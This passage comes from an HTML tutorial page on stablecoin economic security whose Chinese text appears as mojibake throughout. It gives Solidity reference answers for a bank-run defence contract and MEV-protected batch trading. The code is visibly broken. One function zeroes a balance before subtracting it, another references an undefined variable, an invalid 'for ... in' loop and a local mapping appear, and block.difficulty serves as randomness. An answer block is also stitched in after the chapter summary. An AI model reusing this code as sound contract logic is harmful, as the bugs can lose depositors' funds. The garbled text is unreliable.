        const improvements: Improvement[] = [];
        
        // æŠ€æœ¯æ”¹è¿›
        if (incident.category === 'technical') {
            improvements.push({
                area: 'Smart Contract',
                recommendation: 'Implement additional validation checks',
                priority: 'HIGH',
                effort: 'MEDIUM'
            });
        }
        
        // æµç¨‹æ”¹è¿›
        improvements.push({
            area: 'Monitoring',
            recommendation: 'Add real-time alerts for similar patterns',
            priority: 'HIGH',
            effort: 'LOW'
        });
        
        // æ²»ç†æ”¹è¿›
        if (incident.severity === 'HIGH') {
            improvements.push({
                area: 'Governance',
                recommendation: 'Review and update emergency procedures',
                priority: 'MEDIUM',
                effort: 'MEDIUM'
            });
        }
        
        return improvements;
    }
}</code></pre>
                </div>
            </div>
        </div>

        <div class="exercise">
            <div class="exercise-header">
                <span class="exercise-icon">ğŸ’»</span>
                <h4>ç»ƒä¹ 10.1ï¼šè®¾è®¡é˜²å¾¡é“¶è¡ŒæŒ¤å…‘çš„æœºåˆ¶</h4>
            </div>
            <p>è®¾è®¡ä¸€ä¸ªç¨³å®šå¸ç³»ç»Ÿï¼Œå®ç°ä»¥ä¸‹é˜²å¾¡é“¶è¡ŒæŒ¤å…‘çš„åŠŸèƒ½ï¼š</p>
            <ol>
                <li>åŠ¨æ€ææ¬¾é™åˆ¶ï¼ˆåŸºäºç³»ç»Ÿå¥åº·åº¦ï¼‰</li>
                <li>ææ¬¾æ’é˜Ÿæœºåˆ¶</li>
                <li>æ¿€åŠ±é•¿æœŸæŒæœ‰çš„å¥–åŠ±ç³»ç»Ÿ</li>
                <li>ç´§æ€¥æƒ…å†µä¸‹çš„éƒ¨åˆ†èµå›æœºåˆ¶</li>
                <li>æµåŠ¨æ€§æä¾›è€…ä¿æŠ¤</li>
            </ol>
            
            <button class="answer-toggle" onclick="toggleAnswer(this)">æŸ¥çœ‹å‚è€ƒç­”æ¡ˆ</button>
            <div class="answer-content">
                <div class="code-block">
                    <div class="code-header">
                        <span class="code-language">solidity</span>
                    </div>
                    <div class="code-content">
                        <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract BankRunDefenseSystem {
    // ç³»ç»ŸçŠ¶æ€
    enum SystemHealth { HEALTHY, STRESSED, CRITICAL }
    SystemHealth public systemHealth = SystemHealth.HEALTHY;
    
    // ç”¨æˆ·æ•°æ®
    struct UserData {
        uint256 balance;
        uint256 lockedBalance;
        uint256 lastWithdrawTime;
        uint256 loyaltyPoints;
        bool isLiquidityProvider;
    }
    
    mapping(address => UserData) public users;
    
    // ææ¬¾é˜Ÿåˆ—
    struct WithdrawRequest {
        address user;
        uint256 amount;
        uint256 requestTime;
        uint256 executeTime;
        bool processed;
    }
    
    WithdrawRequest[] public withdrawQueue;
    mapping(address => uint256) public pendingWithdrawals;
    
    // ç³»ç»Ÿå‚æ•°
    uint256 public totalDeposits;
    uint256 public totalReserves;
    uint256 public dailyWithdrawLimit;
    uint256 public queueDelay = 24 hours;
    
    // åŠ¨æ€é™åˆ¶å‚æ•°
    uint256 public baseWithdrawRate = 1000; // 10%
    uint256 public stressedWithdrawRate = 500; // 5%
    uint256 public criticalWithdrawRate = 200; // 2%
    
    // å¿ è¯šåº¦å¥–åŠ±
    uint256 public constant LOYALTY_BONUS_RATE = 10; // 0.1% per day
    uint256 public constant LP_PROTECTION_MULTIPLIER = 2;
    
    // äº‹ä»¶
    event WithdrawRequested(address user, uint256 amount, uint256 executeTime);
    event WithdrawProcessed(address user, uint256 amount);
    event SystemHealthUpdated(SystemHealth newHealth);
    
    // å­˜æ¬¾åŠŸèƒ½
    function deposit() external payable {
        UserData storage user = users[msg.sender];
        user.balance += msg.value;
        totalDeposits += msg.value;
        totalReserves += msg.value;
        
        // é‡ç½®å¿ è¯šåº¦è®¡æ—¶
        if (user.lastWithdrawTime == 0) {
            user.lastWithdrawTime = block.timestamp;
        }
    }
    
    // è¯·æ±‚ææ¬¾
    function requestWithdraw(uint256 amount) external {
        UserData storage user = users[msg.sender];
        require(user.balance >= amount, "Insufficient balance");
        require(pendingWithdrawals[msg.sender] == 0, "Pending withdrawal exists");
        
        // è®¡ç®—åŠ¨æ€ææ¬¾é™åˆ¶
        uint256 maxWithdraw = calculateMaxWithdraw(msg.sender);
        require(amount <= maxWithdraw, "Exceeds withdrawal limit");
        
        // è®¡ç®—é˜Ÿåˆ—å»¶è¿Ÿ
        uint256 delay = calculateQueueDelay(amount);
        uint256 executeTime = block.timestamp + delay;
        
        // åˆ›å»ºææ¬¾è¯·æ±‚
        withdrawQueue.push(WithdrawRequest({
            user: msg.sender,
            amount: amount,
            requestTime: block.timestamp,
            executeTime: executeTime,
            processed: false
        }));
        
        pendingWithdrawals[msg.sender] = amount;
        user.balance -= amount;
        
        emit WithdrawRequested(msg.sender, amount, executeTime);
    }
    
    // è®¡ç®—æœ€å¤§ææ¬¾é¢åº¦
    function calculateMaxWithdraw(address userAddr) public view returns (uint256) {
        UserData storage user = users[userAddr];
        uint256 baseLimit = (user.balance * getCurrentWithdrawRate()) / 10000;
        
        // LPä¿æŠ¤ï¼šæµåŠ¨æ€§æä¾›è€…æœ‰æ›´é«˜é¢åº¦
        if (user.isLiquidityProvider) {
            baseLimit *= LP_PROTECTION_MULTIPLIER;
        }
        
        // å¿ è¯šåº¦å¥–åŠ±ï¼šé•¿æœŸæŒæœ‰è€…é¢åº¦æå‡
        uint256 holdingDays = (block.timestamp - user.lastWithdrawTime) / 1 days;
        uint256 loyaltyMultiplier = 10000 + (holdingDays * LOYALTY_BONUS_RATE);
        baseLimit = (baseLimit * loyaltyMultiplier) / 10000;
        
        // ä¸èƒ½è¶…è¿‡æ¯æ—¥æ€»é™é¢çš„ä»½é¢
        uint256 userShare = (user.balance * 10000) / totalDeposits;
        uint256 dailyShare = (dailyWithdrawLimit * userShare) / 10000;
        
        return min(baseLimit, dailyShare);
    }
    
    // è·å–å½“å‰ææ¬¾ç‡
    function getCurrentWithdrawRate() public view returns (uint256) {
        if (systemHealth == SystemHealth.CRITICAL) {
            return criticalWithdrawRate;
        } else if (systemHealth == SystemHealth.STRESSED) {
            return stressedWithdrawRate;
        } else {
            return baseWithdrawRate;
        }
    }
    
    // è®¡ç®—é˜Ÿåˆ—å»¶è¿Ÿ
    function calculateQueueDelay(uint256 amount) public view returns (uint256) {
        uint256 baseDelay = queueDelay;
        
        // å¤§é¢ææ¬¾å»¶è¿Ÿæ›´é•¿
        if (amount > totalReserves / 100) { // >1%å‚¨å¤‡
            baseDelay *= 2;
        }
        
        // ç³»ç»Ÿå‹åŠ›ä¸‹å»¶è¿Ÿå¢åŠ 
        if (systemHealth == SystemHealth.STRESSED) {
            baseDelay *= 2;
        } else if (systemHealth == SystemHealth.CRITICAL) {
            baseDelay *= 4;
        }
        
        return baseDelay;
    }
    
    // å¤„ç†ææ¬¾é˜Ÿåˆ—
    function processWithdrawals(uint256 maxCount) external {
        uint256 processed = 0;
        uint256 totalProcessed = 0;
        
        for (uint256 i = 0; i < withdrawQueue.length && processed < maxCount; i++) {
            WithdrawRequest storage request = withdrawQueue[i];
            
            if (!request.processed && 
                block.timestamp >= request.executeTime &&
                totalReserves >= request.amount) {
                
                // æ‰§è¡Œææ¬¾
                payable(request.user).transfer(request.amount);
                totalReserves -= request.amount;
                totalDeposits -= request.amount;
                
                // æ›´æ–°ç”¨æˆ·æ•°æ®
                users[request.user].lastWithdrawTime = block.timestamp;
                users[request.user].loyaltyPoints = 0;
                pendingWithdrawals[request.user] = 0;
                
                request.processed = true;
                processed++;
                totalProcessed += request.amount;
                
                emit WithdrawProcessed(request.user, request.amount);
            }
        }
        
        // æ›´æ–°ç³»ç»Ÿå¥åº·åº¦
        updateSystemHealth();
    }
    
    // ç´§æ€¥éƒ¨åˆ†èµå›
    function emergencyPartialRedeem() external {
        require(systemHealth == SystemHealth.CRITICAL, "Not in emergency");
        
        UserData storage user = users[msg.sender];
        require(user.balance > 0, "No balance");
        
        // è®¡ç®—å¯èµå›æ¯”ä¾‹ï¼ˆåŸºäºå‚¨å¤‡ç‡ï¼‰
        uint256 redeemRate = (totalReserves * 10000) / totalDeposits;
        uint256 redeemAmount = (user.balance * redeemRate) / 10000;
        
        // ç«‹å³èµå›éƒ¨åˆ†èµ„é‡‘
        user.balance = 0;
        payable(msg.sender).transfer(redeemAmount);
        
        totalReserves -= redeemAmount;
        totalDeposits -= user.balance;
    }
    
    // æ›´æ–°ç³»ç»Ÿå¥åº·åº¦
    function updateSystemHealth() public {
        uint256 reserveRatio = (totalReserves * 10000) / totalDeposits;
        uint256 queuePressure = (getQueuedAmount() * 10000) / totalReserves;
        
        if (reserveRatio < 2000 || queuePressure > 5000) { // <20%å‚¨å¤‡æˆ–>50%æ’é˜Ÿ
            systemHealth = SystemHealth.CRITICAL;
        } else if (reserveRatio < 4000 || queuePressure > 3000) { // <40%å‚¨å¤‡æˆ–>30%æ’é˜Ÿ
            systemHealth = SystemHealth.STRESSED;
        } else {
            systemHealth = SystemHealth.HEALTHY;
        }
        
        emit SystemHealthUpdated(systemHealth);
    }
    
    // è·å–æ’é˜Ÿæ€»é¢
    function getQueuedAmount() public view returns (uint256) {
        uint256 total = 0;
        for (uint256 i = 0; i < withdrawQueue.length; i++) {
            if (!withdrawQueue[i].processed) {
                total += withdrawQueue[i].amount;
            }
        }
        return total;
    }
    
    // æ¿€åŠ±æœºåˆ¶ï¼šè´¨æŠ¼è·å¾—å¿ è¯šåº¦ç§¯åˆ†
    function stakeLoyalty(uint256 amount, uint256 duration) external {
        UserData storage user = users[msg.sender];
        require(user.balance >= amount, "Insufficient balance");
        
        user.balance -= amount;
        user.lockedBalance += amount;
        
        // æ ¹æ®é”å®šæ—¶é—´ç»™äºˆå¿ è¯šåº¦ç§¯åˆ†
        uint256 points = (amount * duration) / 30 days;
        user.loyaltyPoints += points;
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <div class="exercise">
            <div class="exercise-header">
                <span class="exercise-icon">ğŸ”</span>
                <h4>ç»ƒä¹ 10.2ï¼šMEVé˜²æŠ¤æœºåˆ¶å®ç°</h4>
            </div>
            <p>å®ç°ä¸€ä¸ªå…·æœ‰MEVé˜²æŠ¤çš„äº¤æ˜“ç³»ç»Ÿï¼ŒåŒ…æ‹¬ï¼š</p>
            <ul>
                <li>å‰ç½®äº¤æ˜“ï¼ˆfront-runningï¼‰é˜²æŠ¤</li>
                <li>ä¸‰æ˜æ²»æ”»å‡»é˜²æŠ¤</li>
                <li>æ—¶é—´å»¶è¿Ÿæœºåˆ¶</li>
                <li>æ‰¹é‡äº¤æ˜“æ‰§è¡Œ</li>
                <li>MEVåˆ©æ¶¦å›é¦ˆæœºåˆ¶</li>
            </ul>
            <button class="answer-toggle" onclick="toggleAnswer(this)">æŸ¥çœ‹å‚è€ƒç­”æ¡ˆ</button>
            <div class="answer-content">
                <pre><code class="language-solidity">// MEVé˜²æŠ¤äº¤æ˜“ç³»ç»Ÿå®Œæ•´å®ç°
contract MEVProtectedTradingSystem {
    using SafeERC20 for IERC20;
    
    // çŠ¶æ€å˜é‡
    struct TradeRequest {
        address trader;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        bytes32 commitment;
        uint256 submitBlock;
        uint256 revealBlock;
        bool executed;
    }
    
    mapping(bytes32 => TradeRequest) public trades;
    mapping(address => uint256) public lastTradeBlock;
    
    // MEVä¿æŠ¤å‚æ•°
    uint256 public constant COMMIT_DELAY = 2;     // æäº¤å2ä¸ªåŒºå—æ‰èƒ½æ‰§è¡Œ
    uint256 public constant REVEAL_WINDOW = 10;   // 10ä¸ªåŒºå—çš„æ‰§è¡Œçª—å£
    uint256 public constant BATCH_SIZE = 20;      // æ‰¹é‡æ‰§è¡Œæ•°é‡
    uint256 public constant MEV_SHARE = 5000;     // 50%çš„MEVåˆ©æ¶¦è¿”è¿˜ç”¨æˆ·
    
    // æ‰¹é‡äº¤æ˜“é˜Ÿåˆ—
    bytes32[] public pendingTrades;
    uint256 public mevProfits;
    
    // äº‹ä»¶
    event TradeCommitted(bytes32 indexed tradeId, address trader);
    event TradeRevealed(bytes32 indexed tradeId, uint256 amountOut);
    event MEVProfitDistributed(uint256 amount);
    
    // ç¬¬ä¸€æ­¥ï¼šæäº¤äº¤æ˜“æ‰¿è¯º
    function commitTrade(
        bytes32 commitment
    ) external returns (bytes32 tradeId) {
        // é˜²æ­¢åŒä¸€åŒºå—å¤šæ¬¡äº¤æ˜“
        require(
            lastTradeBlock[msg.sender] < block.number,
            "One trade per block"
        );
        
        tradeId = keccak256(abi.encodePacked(
            msg.sender,
            commitment,
            block.number
        ));
        
        trades[tradeId] = TradeRequest({
            trader: msg.sender,
            tokenIn: address(0),
            tokenOut: address(0),
            amountIn: 0,
            minAmountOut: 0,
            commitment: commitment,
            submitBlock: block.number,
            revealBlock: 0,
            executed: false
        });
        
        lastTradeBlock[msg.sender] = block.number;
        emit TradeCommitted(tradeId, msg.sender);
    }
    
    // ç¬¬äºŒæ­¥ï¼šæ­ç¤ºäº¤æ˜“ç»†èŠ‚
    function revealTrade(
        bytes32 tradeId,
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        uint256 nonce
    ) external {
        TradeRequest storage trade = trades[tradeId];
        
        require(trade.trader == msg.sender, "Not trade owner");
        require(!trade.executed, "Already executed");
        require(
            block.number >= trade.submitBlock + COMMIT_DELAY,
            "Too early to reveal"
        );
        require(
            block.number <= trade.submitBlock + COMMIT_DELAY + REVEAL_WINDOW,
            "Reveal window expired"
        );
        
        // éªŒè¯æ‰¿è¯º
        bytes32 hash = keccak256(abi.encodePacked(
            tokenIn,
            tokenOut,
            amountIn,
            minAmountOut,
            nonce,
            msg.sender
        ));
        require(hash == trade.commitment, "Invalid commitment");
        
        // æ›´æ–°äº¤æ˜“ä¿¡æ¯
        trade.tokenIn = tokenIn;
        trade.tokenOut = tokenOut;
        trade.amountIn = amountIn;
        trade.minAmountOut = minAmountOut;
        trade.revealBlock = block.number;
        
        // æ·»åŠ åˆ°å¾…æ‰§è¡Œé˜Ÿåˆ—
        pendingTrades.push(tradeId);
        
        // å¦‚æœé˜Ÿåˆ—æ»¡äº†ï¼Œæ‰§è¡Œæ‰¹é‡äº¤æ˜“
        if (pendingTrades.length >= BATCH_SIZE) {
            _executeBatch();
        }
    }
    
    // æ‰¹é‡æ‰§è¡Œäº¤æ˜“
    function executeBatch() external {
        require(pendingTrades.length > 0, "No pending trades");
        _executeBatch();
    }
    
    function _executeBatch() internal {
        uint256 batchProfit = 0;
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            pendingTrades.length
        )));
        
        // éšæœºåŒ–æ‰§è¡Œé¡ºåº
        for (uint256 i = pendingTrades.length; i > 1; i--) {
            uint256 j = seed % i;
            bytes32 temp = pendingTrades[i-1];
            pendingTrades[i-1] = pendingTrades[j];
            pendingTrades[j] = temp;
            seed = uint256(keccak256(abi.encodePacked(seed)));
        }
        
        // æ‰§è¡Œæ‰€æœ‰äº¤æ˜“
        for (uint256 i = 0; i < pendingTrades.length; i++) {
            TradeRequest storage trade = trades[pendingTrades[i]];
            if (!trade.executed) {
                uint256 profit = _executeTrade(trade);
                batchProfit += profit;
                trade.executed = true;
            }
        }
        
        // æ¸…ç©ºé˜Ÿåˆ—
        delete pendingTrades;
        
        // ç´¯ç§¯MEVåˆ©æ¶¦
        if (batchProfit > 0) {
            mevProfits += batchProfit;
        }
    }
    
    function _executeTrade(
        TradeRequest storage trade
    ) internal returns (uint256) {
        // è½¬å…¥ä»£å¸
        IERC20(trade.tokenIn).safeTransferFrom(
            trade.trader,
            address(this),
            trade.amountIn
        );
        
        // æ‰§è¡Œäº¤æ˜“ï¼ˆè¿™é‡Œç®€åŒ–å¤„ç†ï¼Œå®é™…éœ€è¦è°ƒç”¨DEXï¼‰
        uint256 amountOut = _performSwap(
            trade.tokenIn,
            trade.tokenOut,
            trade.amountIn
        );
        
        require(amountOut >= trade.minAmountOut, "Slippage too high");
        
        // è½¬å‡ºä»£å¸
        IERC20(trade.tokenOut).safeTransfer(
            trade.trader,
            amountOut
        );
        
        emit TradeRevealed(pendingTrades[i], amountOut);
        
        // è®¡ç®—MEVï¼ˆç®€åŒ–ï¼šå®é™…éœ€è¦æ¯”è¾ƒå¸‚åœºä»·æ ¼ï¼‰
        uint256 marketPrice = getMarketPrice(trade.tokenIn, trade.tokenOut);
        uint256 executionPrice = (amountOut * 1e18) / trade.amountIn;
        
        if (executionPrice > marketPrice) {
            return ((executionPrice - marketPrice) * trade.amountIn) / 1e18;
        }
        
        return 0;
    }
    
    // åˆ†é…MEVåˆ©æ¶¦
    function distributeMEVProfits() external {
        require(mevProfits > 0, "No profits to distribute");
        
        uint256 toDistribute = mevProfits;
        mevProfits = 0;
        
        // 50%è¿”è¿˜ç»™äº¤æ˜“è€…ï¼ˆåŸºäºäº¤æ˜“é‡åŠ æƒï¼‰
        uint256 userShare = (toDistribute * MEV_SHARE) / 10000;
        
        // å®é™…åˆ†é…é€»è¾‘ï¼ˆç®€åŒ–ï¼‰
        // ...
        
        emit MEVProfitDistributed(toDistribute);
    }
    
    // ç´§æ€¥æš‚åœ
    function emergencyPause() external onlyRole(PAUSER_ROLE) {
        _pause();
        
        // é€€è¿˜æ‰€æœ‰æœªæ‰§è¡Œäº¤æ˜“
        for (uint256 i = 0; i < pendingTrades.length; i++) {
            TradeRequest storage trade = trades[pendingTrades[i]];
            if (!trade.executed && trade.amountIn > 0) {
                IERC20(trade.tokenIn).safeTransfer(
                    trade.trader,
                    trade.amountIn
                );
                trade.executed = true;
            }
        }
        
        delete pendingTrades;
    }
}</code></pre>
            </div>
        </div>

        <h3 id="chapter10-summary">æœ¬ç« å°ç»“</h3>
        <div class="summary-box">
            <h4>æ ¸å¿ƒè¦ç‚¹å›é¡¾ï¼š</h4>
            <ul>
                <li><strong>ç»æµæ”»å‡»æ¨¡å‹</strong>ï¼š
                    <ul>
                        <li>å¸‚åœºæ“çºµæ”»å‡»ï¼šä»·æ ¼æ“çºµã€æµåŠ¨æ€§æ”»å‡»ã€ä¸‰æ˜æ²»æ”»å‡»</li>
                        <li>ç³»ç»Ÿæ€§æ”»å‡»ï¼šé“¶è¡ŒæŒ¤å…‘ã€æ­»äº¡èºæ—‹ã€æ²»ç†æ”»å‡»ã€çº§è”æ¸…ç®—</li>
                        <li>åšå¼ˆè®ºåˆ†æï¼šçº³ä»€å‡è¡¡ã€æ”»é˜²åšå¼ˆã€é“¶è¡ŒæŒ¤å…‘æ¨¡å‹</li>
                    </ul>
                </li>
                <li><strong>DeFiç‰¹å®šæ”»å‡»</strong>ï¼š
                    <ul>
                        <li>é—ªç”µè´·æ”»å‡»ï¼šåˆ©ç”¨åŸå­æ€§è¿›è¡Œæ— èµ„æœ¬å¥—åˆ©</li>
                        <li>MEVæ”»å‡»ï¼šå‰ç½®äº¤æ˜“ã€åç½®äº¤æ˜“ã€ä¸‰æ˜æ²»æ”»å‡»</li>
                        <li>é¢„è¨€æœºæ“çºµï¼šåˆ©ç”¨å»¶è¿Ÿå’Œä½æµåŠ¨æ€§æ“çºµä»·æ ¼</li>
                    </ul>
                </li>
                <li><strong>é˜²å¾¡æœºåˆ¶</strong>ï¼š
                    <ul>
                        <li>åŠ¨æ€å‚æ•°è°ƒæ•´ï¼šæ ¹æ®é£é™©ç­‰çº§è‡ªé€‚åº”è°ƒæ•´ç³»ç»Ÿå‚æ•°</li>
                        <li>ç†”æ–­æœºåˆ¶ï¼šåˆ†çº§å“åº”ï¼Œä»é™åˆ¶åˆ°å®Œå…¨åœæ­¢</li>
                        <li>æ—¶é—´å»¶è¿Ÿï¼šTWAPã€æäº¤-æ­ç¤ºæ¨¡å¼ã€æ‰¹é‡æ‰§è¡Œ</li>
                    </ul>
                </li>
                <li><strong>é£é™©ç®¡ç†</strong>ï¼š
                    <ul>
                        <li>ä¿é™©åŸºé‡‘ï¼šé£é™©å®šä»·ã€åˆ†çº§ä¿éšœã€æ¿€åŠ±ç›¸å®¹</li>
                        <li>é£é™©å…±æ‹…ï¼šé›†ä½“æ‰¿æ‹…æŸå¤±ã€æ¿€åŠ±é•¿æœŸå‚ä¸</li>
                        <li>å±æœºå“åº”ï¼šåˆ†çº§å“åº”æ¡†æ¶ã€è‡ªåŠ¨åŒ–å¤„ç†ã€å¿«é€Ÿæ¢å¤</li>
                    </ul>
                </li>
            </ul>
            
            <h4>å…³é”®é˜²å¾¡åŸåˆ™ï¼š</h4>
            <ol>
                <li><strong>æ·±åº¦é˜²å¾¡</strong>ï¼šå¤šå±‚é˜²æŠ¤ï¼Œå•ä¸€æœºåˆ¶å¤±æ•ˆä¸ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒ</li>
                <li><strong>æ¿€åŠ±ç›¸å®¹</strong>ï¼šè®©è¯šå®è¡Œä¸ºæ¯”æ”»å‡»æ›´æœ‰åˆ©å¯å›¾</li>
                <li><strong>é€æ˜å¯å®¡è®¡</strong>ï¼šæ‰€æœ‰é˜²å¾¡æœºåˆ¶å…¬å¼€é€æ˜ï¼Œæ¥å—ç¤¾åŒºç›‘ç£</li>
                <li><strong>å¿«é€Ÿå“åº”</strong>ï¼šè‡ªåŠ¨åŒ–æ£€æµ‹å’Œå“åº”ï¼Œæœ€å°åŒ–æŸå¤±</li>
                <li><strong>ç”¨æˆ·ä¿æŠ¤</strong>ï¼šä¼˜å…ˆä¿æŠ¤æ™®é€šç”¨æˆ·ï¼Œé™åˆ¶å¤§æˆ·æ“çºµ</li>
            </ol>
            
            <h4>æœªæ¥å±•æœ›ï¼š</h4>
            <ul>
                <li><strong>AIé©±åŠ¨é˜²å¾¡</strong>ï¼šæœºå™¨å­¦ä¹ æ¨¡å‹é¢„æµ‹å’Œé˜²èŒƒæ”»å‡»</li>
                <li><strong>è·¨é“¾å®‰å…¨</strong>ï¼šç»Ÿä¸€çš„è·¨é“¾å®‰å…¨æ ‡å‡†å’Œåä½œæœºåˆ¶</li>
                <li><strong>å½¢å¼åŒ–éªŒè¯</strong>ï¼šæ•°å­¦è¯æ˜ç³»ç»Ÿçš„å®‰å…¨æ€§</li>
                <li><strong>å»ä¸­å¿ƒåŒ–ä¿é™©</strong>ï¼šåŸºäºé¢„æµ‹å¸‚åœºçš„é£é™©å®šä»·</li>
                <li><strong>ç¤¾åŒºå…ç–«</strong>ï¼šé€šè¿‡æ•™è‚²å’Œå·¥å…·æå‡æ•´ä½“å®‰å…¨æ„è¯†</li>
            </ul>
            
            <div class="tip">
                <strong>å®è·µå»ºè®®ï¼š</strong>
                ç»æµå®‰å…¨æ˜¯ç¨³å®šå¸ç³»ç»Ÿçš„ç”Ÿå‘½çº¿ã€‚åœ¨è®¾è®¡ä»»ä½•æ–°åŠŸèƒ½æ—¶ï¼Œéƒ½è¦è€ƒè™‘ï¼š
                <ul>
                    <li>è¿™ä¸ªåŠŸèƒ½å¯èƒ½è¢«å¦‚ä½•æ”»å‡»ï¼Ÿ</li>
                    <li>æ”»å‡»çš„æˆæœ¬å’Œæ”¶ç›Šå¦‚ä½•ï¼Ÿ</li>
                    <li>å¦‚ä½•è®©æ”»å‡»å˜å¾—ä¸ç»æµï¼Ÿ</li>
                    <li>å¦‚æœæ”»å‡»å‘ç”Ÿï¼Œå¦‚ä½•æœ€å°åŒ–æŸå¤±ï¼Ÿ</li>
                    <li>å¦‚ä½•å¿«é€Ÿæ¢å¤ç³»ç»Ÿï¼Ÿ</li>
                </ul>
                è®°ä½ï¼šå®‰å…¨ä¸æ˜¯ä¸€æ¬¡æ€§çš„å·¥ä½œï¼Œè€Œæ˜¯æŒç»­çš„è¿‡ç¨‹ã€‚</div>
        </div>
    </div>
            
            <button class="answer-toggle" onclick="toggleAnswer(this)">æŸ¥çœ‹å‚è€ƒç­”æ¡ˆ</button>
            <div class="answer-content">
                <div class="code-block">
                    <div class="code-header">
                        <span class="code-language">solidity</span>
                    </div>
                    <div class="code-content">
                        <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MEVProtectionSystem {
    // äº¤æ˜“æ‰¹æ¬¡
    struct Batch {
        uint256 id;
        uint256 startTime;
        uint256 endTime;
        uint256 seed;
        bool executed;
        uint256 totalValue;
        uint256 mevProfit;
    }
    
    // å¾…å¤„ç†äº¤æ˜“
    struct PendingTx {
        address user;
        bytes data;
        uint256 value;
        uint256 gasPrice;
        uint256 deadline;
        bytes32 commitment;
    }
    
    mapping(uint256 => Batch) public batches;
    mapping(uint256 => PendingTx[]) public batchTransactions;
    uint256 public currentBatchId;
    
    // MEVåˆ†é…
    mapping(address => uint256) public userMEVShares;
    uint256 public totalMEVShares;
    uint256 public accumulatedMEV;
    
    // æ‰¹æ¬¡å‚æ•°
    uint256 public batchDuration = 12 seconds; // 1ä¸ªåŒºå—
    uint256 public minBatchSize = 10;
    uint256 public maxBatchSize = 100;
    
    // ç§æœ‰å†…å­˜æ± 
    mapping(bytes32 => bool) private commitments;
    
    event BatchCreated(uint256 batchId, uint256 endTime);
    event TransactionSubmitted(address user, uint256 batchId, bytes32 commitment);
    event BatchExecuted(uint256 batchId, uint256 txCount, uint256 mevCaptured);
    event MEVDistributed(address user, uint256 amount);
    
    // æäº¤äº¤æ˜“ï¼ˆä¸¤é˜¶æ®µæäº¤ï¼‰
    function submitTransaction(
        bytes32 commitment,
        uint256 deadline
    ) external payable {
        require(deadline > block.timestamp, "Invalid deadline");
        require(!commitments[commitment], "Duplicate commitment");
        
        // è·å–æˆ–åˆ›å»ºå½“å‰æ‰¹æ¬¡
        uint256 batchId = getCurrentBatch();
        
        // è®°å½•æ‰¿è¯º
        commitments[commitment] = true;
        
        emit TransactionSubmitted(msg.sender, batchId, commitment);
    }
    
    // æ­ç¤ºäº¤æ˜“
    function revealTransaction(
        uint256 batchId,
        bytes calldata data,
        uint256 nonce
    ) external {
        // éªŒè¯æ‰¿è¯º
        bytes32 commitment = keccak256(abi.encodePacked(
            msg.sender,
            data,
            nonce,
            batchId
        ));
        require(commitments[commitment], "Invalid commitment");
        
        // éªŒè¯æ‰¹æ¬¡ä»åœ¨æ”¶é›†ä¸­
        Batch storage batch = batches[batchId];
        require(block.timestamp < batch.endTime, "Batch ended");
        require(!batch.executed, "Batch already executed");
        
        // æ·»åŠ åˆ°æ‰¹æ¬¡
        batchTransactions[batchId].push(PendingTx({
            user: msg.sender,
            data: data,
            value: 0,
            gasPrice: tx.gasprice,
            deadline: block.timestamp + 300,
            commitment: commitment
        }));
        
        // æ›´æ–°ç”¨æˆ·MEVä»½é¢
        userMEVShares[msg.sender] += 1;
        totalMEVShares += 1;
    }
    
    // æ‰§è¡Œæ‰¹æ¬¡
    function executeBatch(uint256 batchId) external {
        Batch storage batch = batches[batchId];
        require(block.timestamp >= batch.endTime, "Batch not ready");
        require(!batch.executed, "Already executed");
        
        PendingTx[] storage txs = batchTransactions[batchId];
        require(txs.length >= minBatchSize, "Insufficient transactions");
        
        // ç”Ÿæˆéšæœºç§å­
        batch.seed = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            blockhash(block.number - 1)
        )));
        
        // éšæœºæ’åºäº¤æ˜“
        shuffleTransactions(txs, batch.seed);
        
        // è®°å½•æ‰§è¡Œå‰ä½™é¢
        uint256 balanceBefore = address(this).balance;
        
        // æ‰§è¡Œæ‰€æœ‰äº¤æ˜“
        uint256 successCount = 0;
        for (uint256 i = 0; i < txs.length && i < maxBatchSize; i++) {
            if (executeTransaction(txs[i])) {
                successCount++;
            }
        }
        
        // è®¡ç®—MEVæ”¶ç›Š
        uint256 balanceAfter = address(this).balance;
        if (balanceAfter > balanceBefore) {
            batch.mevProfit = balanceAfter - balanceBefore;
            accumulatedMEV += batch.mevProfit;
        }
        
        batch.executed = true;
        emit BatchExecuted(batchId, successCount, batch.mevProfit);
        
        // å¦‚æœMEVç´¯ç§¯è¶³å¤Ÿï¼Œè§¦å‘åˆ†é…
        if (accumulatedMEV > 0.1 ether) {
            distributeMEV();
        }
    }
    
    // Fisher-Yatesæ´—ç‰Œç®—æ³•
    function shuffleTransactions(
        PendingTx[] storage txs,
        uint256 seed
    ) internal {
        uint256 n = txs.length;
        
        for (uint256 i = n - 1; i > 0; i--) {
            uint256 j = uint256(keccak256(abi.encodePacked(seed, i))) % (i + 1);
            
            // äº¤æ¢
            PendingTx memory temp = txs[i];
            txs[i] = txs[j];
            txs[j] = temp;
        }
    }
    
    // æ‰§è¡Œå•ä¸ªäº¤æ˜“
    function executeTransaction(PendingTx memory tx) internal returns (bool) {
        // æ£€æŸ¥deadline
        if (block.timestamp > tx.deadline) {
            return false;
        }
        
        // è§£ç å¹¶æ‰§è¡Œäº¤æ˜“
        (bool success,) = address(this).call{value: tx.value}(tx.data);
        
        return success;
    }
    
    // åˆ†é…MEVæ”¶ç›Š
    function distributeMEV() public {
        require(accumulatedMEV > 0, "No MEV to distribute");
        require(totalMEVShares > 0, "No shares");
        
        uint256 totalToDistribute = accumulatedMEV;
        accumulatedMEV = 0;
        
        // ä¿ç•™10%ä½œä¸ºåè®®æ”¶å…¥
        uint256 protocolFee = totalToDistribute / 10;
        uint256 userDistribution = totalToDistribute - protocolFee;
        
        // è®°å½•å·²åˆ†é…çš„ç”¨æˆ·ï¼Œé¿å…é‡å¤
        mapping(address => bool) distributed;
        
        // åˆ†é…ç»™æ‰€æœ‰å‚ä¸è€…
        for (address user in getAllParticipants()) {
            if (userMEVShares[user] > 0 && !distributed[user]) {
                uint256 userShare = (userDistribution * userMEVShares[user]) / totalMEVShares;
                
                payable(user).transfer(userShare);
